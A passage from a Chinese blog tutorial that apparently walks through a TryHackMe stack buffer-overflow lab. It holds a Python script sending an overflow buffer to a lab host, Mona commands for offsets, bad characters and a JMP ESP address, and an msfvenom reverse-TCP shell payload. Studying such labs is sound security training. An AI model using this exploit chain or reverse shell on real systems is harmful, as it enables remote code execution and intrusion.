<span class="line"><span style="color: #ABB2BF">payload </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">postfix </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">buffer </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> prefix </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> overflow </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> retn </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> padding </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> payload </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> postfix</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">s </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> socket.</span><span style="color: #61AFEF">socket</span><span style="color: #ABB2BF">(socket.</span><span style="color: #D19A66">AF_INET</span><span style="color: #ABB2BF">, socket.</span><span style="color: #D19A66">SOCK_STREAM</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">try</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">  s.</span><span style="color: #61AFEF">connect</span><span style="color: #ABB2BF">((ip, port))</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Sending evil buffer...&quot;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">  s.</span><span style="color: #61AFEF">send</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">bytes</span><span style="color: #ABB2BF">(buffer </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\r\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;latin-1&quot;</span><span style="color: #ABB2BF">))</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Done!&quot;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #C678DD">except</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Could not connect.&quot;</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure>

<p>执行他，程序崩溃了，预期行为。然后在调试器的命令栏中输入这些。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 2400 是我们创建的固定序列的长度</span></span>
<span class="line"><span style="color: #ABB2BF">!</span><span style="color: #61AFEF">mona</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">findmsp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-distance</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">2400</span></span></code></pre></div></div></figure>

<p><code>!mona findmsp</code>: 这是 Mona 插件的一个核心命令，用于帮助你找到<strong>内存中的溢出位置</strong>。它主要用来计算从缓冲区起始位置到 EIP 寄存器的精确偏移量。Mona 会读取当前 EIP 的值，然后在这个值中搜索之前由 <code>pattern_create.rb</code> 生成的模式。</p>
<p><code>-distance 2400</code>: Mona 会根据当前 EIP 中被覆盖的值（这是一个模式字符串的片段），在这个 2400 字节的模式字符串中查找这个片段，然后计算出它相对于模式字符串起始位置的偏移量。这个偏移量就是你需要填充的垃圾数据（<code>A</code>s 或其他占位符）的长度，才能恰好覆盖到 EIP。</p>
<img src="/thm_bufferoverflow/image-20250707213356165.png" class="" title="image-20250707213356165">

<p>让我们记录下这个偏移值，也就代表在 <strong>1978</strong> 其后的 <strong>4 个字节</strong>，就是 EIP 的寄存器的位置了。</p>
<p>然后就是测试这个 offset 能用不，脚本中的 offset 设置成上面记下来的值，把之前脚本中的 payload 删掉（nano 编辑器剪切行是 CTRL+K），把 <code>retn</code> 设置成 “ABCD”，这个 “ABCD” 就是<strong>假的 EIP 要执行的地址</strong>，这里我们只是测试一下，看看 EIP 的值会不会变。</p>
<img src="/thm_bufferoverflow/image-20250707213628033.png" class="" title="image-20250707213628033">

<p>可以看到 EIP 变成我们想要的了，<code>44 43 42 41</code> 即反转的 <code>ABCD</code>，为什么这样，因为 x86-x64 架构都用的小端序。</p>
<h2 id="找坏字符"><a href="#找坏字符" class="headerlink" title="找坏字符"></a>找坏字符</h2><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 这段代码是生成 bytearray</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># -b 参数是排除掉生成这样的字符</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这里排除掉了 \x00 即空字节</span></span>
<span class="line"><span style="color: #ABB2BF">!</span><span style="color: #61AFEF">mona</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">bytearray</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x00&quot;</span></span></code></pre></div></div></figure>

<p>然后用一个 python 脚本生成一段 bytearray</p>
<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> x </span><span style="color: #C678DD">in</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">range</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">256</span><span style="color: #ABB2BF">):</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">x&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;</span><span style="color: #D19A66">{</span><span style="color: #C678DD">:02x</span><span style="color: #D19A66">}</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">format</span><span style="color: #ABB2BF">(x), </span><span style="color: #E06C75; font-style: italic">end</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">()</span></span></code></pre></div></div></figure>

<p>把这段代码生成的东西放在之前的 python 脚本中的 <code>payload</code> 字段里面。</p>
<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> socket</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">ip </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;10.10.3.91&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">port </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1337</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">prefix </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;OVERFLOW1 &quot;</span></span>
<span class="line"><span style="color: #ABB2BF">offset </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1978</span></span>
<span class="line"><span style="color: #ABB2BF">overflow </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;A&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> offset</span></span>
<span class="line"><span style="color: #ABB2BF">retn </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;ABCD&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">padding </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">payload </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">postfix </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">buffer </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> prefix </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> overflow </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> retn </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> padding </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> payload </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> postfix</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">s </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> socket.</span><span style="color: #61AFEF">socket</span><span style="color: #ABB2BF">(socket.</span><span style="color: #D19A66">AF_INET</span><span style="color: #ABB2BF">, socket.</span><span style="color: #D19A66">SOCK_STREAM</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">try</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">  s.</span><span style="color: #61AFEF">connect</span><span style="color: #ABB2BF">((ip, port))</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Sending evil buffer...&quot;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">  s.</span><span style="color: #61AFEF">send</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">bytes</span><span style="color: #ABB2BF">(buffer </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\r\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;latin-1&quot;</span><span style="color: #ABB2BF">))</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Done!&quot;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #C678DD">except</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Could not connect.&quot;</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure>

<p>好，这样做了之后，再去服务器那边把程序打开，这边执行。</p>
<p>现在就要注意 <strong>ESP 寄存器</strong>的地址了。ESP 寄存器是<strong>栈的顶部指针</strong>，这里就不多赘述了，你可以把他理解他是一个临时存放数据的地方就行。</p>
<img src="/thm_bufferoverflow/image-20250707215224245.png" class="" title="image-20250707215224245">

<p>这段代码的作用是通过本地生成的 bytearray 和 ESP 中的 bytearray 相比对，找到错误的字符。</p>
<figure class="shiki bash"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">!</span><span style="color: #61AFEF">mona</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">compare</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">C:</span><span style="color: #56B6C2">\m</span><span style="color: #98C379">ona</span><span style="color: #56B6C2">\o</span><span style="color: #98C379">scp</span><span style="color: #56B6C2">\b</span><span style="color: #98C379">ytearray.bin</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-a</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">019</span><span style="color: #98C379">EFA30</span></span></code></pre></div></div></figure>

<img src="/thm_bufferoverflow/image-20250707215559310.png" class="" title="image-20250707215559310">

<p>可以看到这里会有这几个会出错的值 <code>00 07 08 2e 2f a0 a1</code>，让我们删掉那些会出错的值，再生成一版来比对一下。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 这个是去掉预定义的会出错的字符串</span></span>
<span class="line"><span style="color: #ABB2BF">!</span><span style="color: #61AFEF">mona</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">bytearray</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x00\x07\x08\x2e\x2f\xa0\xa1&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这是改好的 payload</span></span>
<span class="line"><span style="color: #61AFEF">payload</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x01\x02\x03\x04\x05\x06\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span></code></pre></div></div></figure>

<img src="/thm_bufferoverflow/image-20250707193600660.png" class="" title="image-20250707193600660">

<p>好，这下一模一样了，没出错。OK，下一步。</p>
<p>**Tips：**一般一个出错的字符，他后面跟着错那个字符应该是好的。但是也不确定，也有可能是两个都会出错，可以用排除法解决。</p>
<h2 id="找合适的跳转地址"><a href="#找合适的跳转地址" class="headerlink" title="找合适的跳转地址"></a>找合适的跳转地址</h2><p>为什么要找到这个跳转地址呢，我们之前不是能控制 EIP 了嘛，现在需要一个地址，他的行为是能够跳转到 ESP 那里，这就是 <code>JMP ESP</code>。我们的 shellcode 不是在 ESP 那儿吗，这样做就能保证执行我们的 shellcode。</p>
<p>为什么不写死地址呢，因为每次执行溢出的时候，我们的代码段可能不会在硬编码的那儿，但是 <code>JMP ESP</code> 能保证每次跳转的都是在那儿，所以能稳定的触发 shellcode。</p>
<p>让我们找到一个跳板地址，并且这个地址不会被坏字符破坏。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 查找指向 ESP 的跳转指令，过滤含指定地址的字符</span></span>
<span class="line"><span style="color: #ABB2BF">!</span><span style="color: #61AFEF">mona</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">jmp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-r</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">esp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-cpb</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x00\x07\x08\x2e\x2f\xa0\xa1&quot;</span></span></code></pre></div></div></figure>

<img src="/thm_bufferoverflow/image-20250707194430742.png" class="" title="image-20250707194430742">

<p>出来这么多，原文让我们随便挑一个，构造好的如下，注意是小端序。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">retn</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\x</span><span style="color: #98C379">af</span><span style="color: #56B6C2">\x</span><span style="color: #98C379">11</span><span style="color: #56B6C2">\x</span><span style="color: #98C379">50</span><span style="color: #56B6C2">\x</span><span style="color: #98C379">62</span></span></code></pre></div></div></figure>

<h2 id="生成马"><a href="#生成马" class="headerlink" title="生成马"></a>生成马</h2><figure class="shiki bash"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 用这行命令生成</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># -b 是排除掉坏字符</span></span>
<span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/shell_reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=</span><span style="color: #D19A66">10.11</span><span style="color: #98C379">.141.2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">4444</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">EXITFUNC=thread</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x00\x07\x08\x2e\x2f\xa0\xa1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">c</span></span></code></pre></div></div></figure>

<img src="/thm_bufferoverflow/image-20250707230034068.png" class="" title="image-20250707230034068">

<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 把生成好的直接复制过来丢到 payload 就行，记得加上括号</span></span>
<span class="line"><span style="color: #61AFEF">payload</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> (</span><span style="color: #98C379">&quot;你&quot;</span></span>
<span class="line"><span style="color: #61AFEF">&quot;的&quot;</span></span>
<span class="line"><span style="color: #61AFEF">&quot;马&quot;</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure>

<h2 id="准备无操作字节（NOPs）"><a href="#准备无操作字节（NOPs）" class="headerlink" title="准备无操作字节（NOPs）"></a>准备无操作字节（NOPs）</h2><p>NOPs 的主要作用是为编码后的 Shellcode 提供必要的解包空间和稳定性，这个作用就是字面意思。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">padding</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x90&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">16</span></span></code></pre></div></div></figure>

<img src="/thm_bufferoverflow/image-20250707195035870.png" class="" title="image-20250707195035870">

<p>顺利上线</p>
<h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>简单画了个图，便于理解。</p>
<img src="/thm_bufferoverflow/image-20250707225512043.png" class="" title="image-20250707225512043">
    
  </article>

  
      
    <div class="nexmoe-post-copyright">
        <strong>本文作者：</strong>Recopec<br>
